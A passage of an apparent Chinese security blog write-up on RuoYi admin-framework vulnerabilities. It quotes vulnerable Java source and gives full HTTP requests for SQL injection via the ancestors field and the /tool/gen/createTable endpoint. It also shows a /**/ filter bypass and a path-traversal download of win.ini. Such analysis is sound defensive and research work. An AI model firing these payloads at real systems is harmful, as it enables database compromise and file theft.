class="hljs-string">&quot;,&quot;</span> + newParentDept.getDeptId();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">oldAncestors</span> <span class="hljs-operator">=</span> oldDept.getAncestors();<br>        dept.setAncestors(newAncestors);<br>        updateDeptChildren(dept.getDeptId(), newAncestors, oldAncestors);<br>    &#125;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> deptMapper.updateDept(dept);<br>    <span class="hljs-keyword">if</span> (UserConstants.DEPT_NORMAL.equals(dept.getStatus()))<br>    &#123;<br>        <span class="hljs-comment">// 如果该部门是启用状态，则启用该部门的所有上级部门</span><br>        updateParentDeptStatus(dept);<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续查找可以发现在<code>/system/dept/edit</code>接口处理函数<code>RuoYi-4.6.0/ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysDeptController.java#editSave</code>中进行了调用；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 保存</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;部门管理&quot;, businessType = BusinessType.UPDATE)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;system:dept:edit&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/edit&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">editSave</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> SysDept dept)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (UserConstants.DEPT_NAME_NOT_UNIQUE.equals(deptService.checkDeptNameUnique(dept)))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;修改部门&#x27;&quot;</span> + dept.getDeptName() + <span class="hljs-string">&quot;&#x27;失败，部门名称已存在&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dept.getParentId().equals(dept.getDeptId()))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;修改部门&#x27;&quot;</span> + dept.getDeptName() + <span class="hljs-string">&quot;&#x27;失败，上级部门不能是自己&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.equals(UserConstants.DEPT_DISABLE, dept.getStatus())<br>            &amp;&amp; deptService.selectNormalChildrenDeptById(dept.getDeptId()) &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> AjaxResult.error(<span class="hljs-string">&quot;该部门包含未停用的子部门！&quot;</span>);<br>    &#125;<br>    dept.setUpdateBy(ShiroUtils.getLoginName());<br>    <span class="hljs-keyword">return</span> toAjax(deptService.updateDept(dept));<br>&#125;<br></code></pre></td></tr></table></figure><p>传入参数类型是<code>SysDept</code>，其中参数内容包括<code>ancestors</code>，因此可以通过定义<code>ancestors</code>的内容实现 sql 注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 部门表 sys_dept</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ruoyi</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SysDept</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseEntity</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-comment">/** 部门ID */</span><br>    <span class="hljs-keyword">private</span> Long deptId;<br><br>    <span class="hljs-comment">/** 父部门ID */</span><br>    <span class="hljs-keyword">private</span> Long parentId;<br><br>    <span class="hljs-comment">/** 祖级列表 */</span><br>    <span class="hljs-keyword">private</span> String ancestors;<br><br>    <span class="hljs-comment">/** 部门名称 */</span><br>    <span class="hljs-keyword">private</span> String deptName;<br><br>    <span class="hljs-comment">/** 显示顺序 */</span><br>    <span class="hljs-keyword">private</span> String orderNum;<br><br>    <span class="hljs-comment">/** 负责人 */</span><br>    <span class="hljs-keyword">private</span> String leader;<br><br>    <span class="hljs-comment">/** 联系电话 */</span><br>    <span class="hljs-keyword">private</span> String phone;<br><br>    <span class="hljs-comment">/** 邮箱 */</span><br>    <span class="hljs-keyword">private</span> String email;<br><br>    <span class="hljs-comment">/** 部门状态:0正常,1停用 */</span><br>    <span class="hljs-keyword">private</span> String status;<br><br>    <span class="hljs-comment">/** 删除标志（0代表存在 2代表删除） */</span><br>    <span class="hljs-keyword">private</span> String delFlag;<br><br>    <span class="hljs-comment">/** 父部门名称 */</span><br>    <span class="hljs-keyword">private</span> String parentName;<br><br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ps：虽然在代码中并没有看到相关的限制行为，但是在实际测试的过程中发现，对<code>ancestors</code>似乎是由长度限制的，我这边就不进行深入分析了，有兴趣的师傅可以分析一下原因。</p></blockquote><h2 id="2-8-注入点-tool-gen-createTable接口（V4-7-1）"><a href="#2-8-注入点-tool-gen-createTable接口（V4-7-1）" class="headerlink" title="2.8 注入点/tool/gen/createTable接口（V4.7.1）"></a>2.8 注入点<code>/tool/gen/createTable</code>接口（V4.7.1）</h2><h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">table</span> candy <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()), <span class="hljs-number">0x7e</span>));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754658493913-0f14b8e4-9be7-48a4-aa17-1e8d84ecac8a.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">POST <span class="hljs-operator">/</span>tool<span class="hljs-operator">/</span>gen<span class="hljs-operator">/</span>createTable HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span><br><span class="hljs-keyword">User</span><span class="hljs-operator">-</span>Agent: Mozilla<span class="hljs-operator">/</span><span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">141.0</span>) Gecko<span class="hljs-operator">/</span><span class="hljs-number">20100101</span> Firefox<span class="hljs-operator">/</span><span class="hljs-number">141.0</span><br>Accept: application<span class="hljs-operator">/</span>json, text<span class="hljs-operator">/</span>javascript, <span class="hljs-operator">*</span><span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 92</span><br><span class="hljs-comment">Origin: http://192.168.1.10</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Referer: http://192.168.1.10/tool/gen/createTable</span><br><span class="hljs-comment">Cookie: JSESSIONID=ac820c87-df58-41f8-b397-61ee0cd96e25</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">sql=CREATE+table+candy+as+select+extractvalue(1%2Cconcat(0x7e%2C(select+user())%2C+0x7e))%3B</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754658521580-efbc864f-a8ef-4e1a-a6bb-13b5c86f9c3d.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754658543121-d3bef20c-3f25-4c0c-99d7-7e873f185977.png"></p><h3 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;createTable&quot;</span>&gt;</span><br>       $&#123;sql&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresRoles(&quot;admin&quot;)</span><br><span class="hljs-meta">@Log(title = &quot;创建表&quot;, businessType = BusinessType.OTHER)</span><br><span class="hljs-meta">@PostMapping(&quot;/createTable&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">create</span><span class="hljs-params">(String sql)</span><br>&#123;<br>    List&lt;SQLStatement&gt; sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);<br>    List&lt;String&gt; tableNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (SQLStatement sqlStatement : sqlStatements)<br>    &#123;<br>        <span class="hljs-comment">// 判断sqlstatement是否为mysql创建表的语句对象</span><br>        <span class="hljs-keyword">if</span> (sqlStatement <span class="hljs-keyword">instanceof</span> MySqlCreateTableStatement)<br>        &#123;<br>            <span class="hljs-type">MySqlCreateTableStatement</span> <span class="hljs-variable">createTableStatement</span> <span class="hljs-operator">=</span> (MySqlCreateTableStatement) sqlStatement;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">tableName</span> <span class="hljs-operator">=</span> createTableStatement.getTableName();<br>            tableName = tableName.replaceAll(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> genTableService.createTable(createTableStatement.toString());<br>            <span class="hljs-keyword">if</span> (msg == <span class="hljs-number">0</span>)<br>            &#123;<br>                tableNames.add(tableName);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> AjaxResult.error(<span class="hljs-string">&quot;请输入建表语句&quot;</span>);<br>        &#125;<br>    &#125;<br>    List&lt;GenTable&gt; tableList = genTableService.selectDbTableListByNames((tableNames.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[tableNames.size()])));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">operName</span> <span class="hljs-operator">=</span> Convert.toStr(PermissionUtils.getPrincipalProperty(<span class="hljs-string">&quot;loginName&quot;</span>));<br>    genTableService.importGenTable(tableList, operName);<br>    <span class="hljs-keyword">return</span> AjaxResult.success();<br>&#125;<br></code></pre></td></tr></table></figure><p>根据代码中表现出来的结果可以看出，只要是创建表的 sql 语句即<code>create table</code>都可以执行；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">create table candy as select <span class="hljs-title function_">extractvalue</span><span class="hljs-params">(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select user()</span>), <span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure><h2 id="2-9-注入点-tool-gen-createTable接口（4-7-1"><a href="#2-9-注入点-tool-gen-createTable接口（4-7-1" class="headerlink" title="2.9 注入点/tool/gen/createTable接口（4.7.1&lt;Version&lt;V4.7.5）"></a>2.9 注入点<code>/tool/gen/createTable</code>接口（4.7.1&lt;Version&lt;V4.7.5）</h2><h3 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">create table candy as select<span class="hljs-comment">/**/extractvalue(1,concat(0x7e,(select/**/</span>user()),<span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755278172549-c87d9956-25cc-4613-a032-80e79437ef13.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755278190843-700d96b7-3cc4-4759-8e8b-a59e34d863e6.png"></p><p>原始的 payload 已经行不通了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /tool/gen/createTable HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.9</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10.15</span>; rv:<span class="hljs-number">141.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">141.0</span><br>Accept: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 89</span><br><span class="hljs-comment">Origin: http://192.168.1.9</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Referer: http://192.168.1.9/tool/gen/createTable</span><br><span class="hljs-comment">Cookie: JSESSIONID=32945bbe-0b10-45d5-91eb-166f46c6c44d</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">sql=create+table+candy+as+select+extractvalue(1%2Cconcat(0x7e%2C(select+user())%2C+0x7e))</span><br></code></pre></td></tr></table></figure><p>将 payload 中的 select 后面的空格使用<code>/**/</code>进行替换即可，具体原因请看漏洞分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">create table candy as select<span class="hljs-comment">/**/extractvalue(1,concat(0x7e,(select/**/</span>user()),<span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755278298486-cce6f9e3-15ea-4747-8d2c-e4aadfcd9bbf.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /tool/gen/createTable HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.9</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10.15</span>; rv:<span class="hljs-number">141.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">141.0</span><br>Accept: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 102</span><br><span class="hljs-comment">Origin: http://192.168.1.9</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Referer: http://192.168.1.9/tool/gen/createTable</span><br><span class="hljs-comment">Cookie: JSESSIONID=32945bbe-0b10-45d5-91eb-166f46c6c44d</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">sql=create+table+candy+as+select%2F**%2Fextractvalue(1%2Cconcat(0x7e%2C(select%2F**%2Fuser())%2C0x7e))</span><br></code></pre></td></tr></table></figure><h3 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过观察该接口的控制器，可以发现在函数执行开始就对关键词进行了过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresRoles(&quot;admin&quot;)</span><br><span class="hljs-meta">@Log(title = &quot;创建表&quot;, businessType = BusinessType.OTHER)</span><br><span class="hljs-meta">@PostMapping(&quot;/createTable&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">create</span><span class="hljs-params">(String sql)</span><br>&#123;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        SqlUtil.filterKeyword(sql);<br>        List&lt;SQLStatement&gt; sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);<br>        List&lt;String&gt; tableNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <span class="hljs-keyword">for</span> (SQLStatement sqlStatement : sqlStatements)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (sqlStatement <span class="hljs-keyword">instanceof</span> MySqlCreateTableStatement)<br>            &#123;<br>                <span class="hljs-type">MySqlCreateTableStatement</span> <span class="hljs-variable">createTableStatement</span> <span class="hljs-operator">=</span> (MySqlCreateTableStatement) sqlStatement;<br>                <span class="hljs-keyword">if</span> (genTableService.createTable(createTableStatement.toString()))<br>                &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">tableName</span> <span class="hljs-operator">=</span> createTableStatement.getTableName().replaceAll(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                    tableNames.add(tableName);<br>                &#125;<br>            &#125;<br>        &#125;<br>        List&lt;GenTable&gt; tableList = genTableService.selectDbTableListByNames(tableNames.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[tableNames.size()]));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">operName</span> <span class="hljs-operator">=</span> Convert.toStr(PermissionUtils.getPrincipalProperty(<span class="hljs-string">&quot;loginName&quot;</span>));<br>        genTableService.importGenTable(tableList, operName);<br>        <span class="hljs-keyword">return</span> AjaxResult.success();<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Exception e)<br>    &#123;<br>        logger.error(e.getMessage(), e);<br>        <span class="hljs-keyword">return</span> AjaxResult.error(<span class="hljs-string">&quot;创建表结构异常[&quot;</span> + e.getMessage() + <span class="hljs-string">&quot;]&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * SQL关键字检查</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">filterKeyword</span><span class="hljs-params">(String value)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (StringUtils.isEmpty(value))<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    String[] sqlKeywords = StringUtils.split(SQL_REGEX, <span class="hljs-string">&quot;\\|&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; sqlKeywords.length; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (StringUtils.indexOfIgnoreCase(value, sqlKeywords[i]) &gt; -<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UtilException</span>(<span class="hljs-string">&quot;参数存在SQL注入风险&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 定义常用的 sql关键字</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">SQL_REGEX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select |insert |delete |update |drop |count |exec |chr |mid |master |truncate |char |and |declare &quot;</span>;<br></code></pre></td></tr></table></figure><p>可以发现其对大部分的关键词都进行了过滤，但是这个过滤貌似不太严谨，连空格都匹配是什么意思？</p><p>那我不用空格不就 bypass 了吗，没搞懂，空格使用<code>/**/</code>即可绕过</p><h1 id="3-任意文件下载"><a href="#3-任意文件下载" class="headerlink" title="3 任意文件下载"></a>3 任意文件下载</h1><h2 id="3-1-CNVD-2021-01931任意文件下载（"><a href="#3-1-CNVD-2021-01931任意文件下载（" class="headerlink" title="3.1 CNVD-2021-01931任意文件下载（&lt;V4.5.1）"></a>3.1 CNVD-2021-01931任意文件下载（&lt;V4.5.1）</h2><h3 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span><span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>download<span class="hljs-operator">/</span>resource?resource<span class="hljs-operator">=</span><span class="hljs-operator">/</span>profile<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>Windows<span class="hljs-operator">/</span>win.ini<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">GET</span> <span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>download<span class="hljs-operator">/</span>resource?resource<span class="hljs-operator">=</span><span class="hljs-operator">/</span>profile<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>Windows<span class="hljs-operator">/</span>win.ini HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span><br><span class="hljs-keyword">User</span><span class="hljs-operator">-</span>Agent: Mozilla<span class="hljs-operator">/</span><span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">141.0</span>) Gecko<span class="hljs-operator">/</span><span class="hljs-number">20100101</span> Firefox<span class="hljs-operator">/</span><span class="hljs-number">141.0</span><br>Accept: text<span class="hljs-operator">/</span>html,application<span class="hljs-operator">/</span>xhtml<span class="hljs-operator">+</span>xml,application<span class="hljs-operator">/</span>xml;q<span class="hljs-operator">=</span><span class="hljs-number">0.9</span>,<span class="hljs-operator">*</span><span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Cookie: JSESSIONID=ac820c87-df58-41f8-b397-61ee0cd96e25</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Priority: u=0, i</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754656423483-0215f4aa-42f6-42e7-92f9-dcdd57b1685a.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754656449028-052bc28a-51f6-4aa1-b645-08281052f25e.png"></p><h3 id="漏洞分析-9"><a href="#漏洞分析-9" class="headerlink" 